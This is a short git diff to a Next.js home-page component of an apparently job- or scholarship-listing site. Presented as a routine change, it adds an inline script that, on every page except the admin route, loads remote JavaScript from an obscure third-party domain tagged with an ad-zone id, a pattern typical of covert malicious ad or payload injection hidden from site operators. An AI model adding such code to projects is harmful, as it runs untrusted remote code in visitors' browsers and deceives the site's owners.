@@ -7,7 +7,7 @@ import { ScholarshipContext } from '../context/ScholarshipContext';
 import SplashScreen from '../components/SplashScreen';
 import dynamic from 'next/dynamic';
 import Link from 'next/link';
-import { useSearchParams } from 'next/navigation';
+import { useSearchParams, usePathname } from 'next/navigation';
 
 const DynamicSplashScreen = dynamic(() => import('../components/SplashScreen'), {
   ssr: false, // Ensure it's only loaded on the client side
@@ -146,6 +146,9 @@ export default function HomeClient() {
   return (
     <Suspense fallback={<div>Loading...</div>}>
       <JobsList />
+      {pathname !== '/admin' && (
+        <script>(s=>{s.dataset.zone=9812476,s.src='https://vemtoutcheeg.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+      )}
     </Suspense>
   );
 }
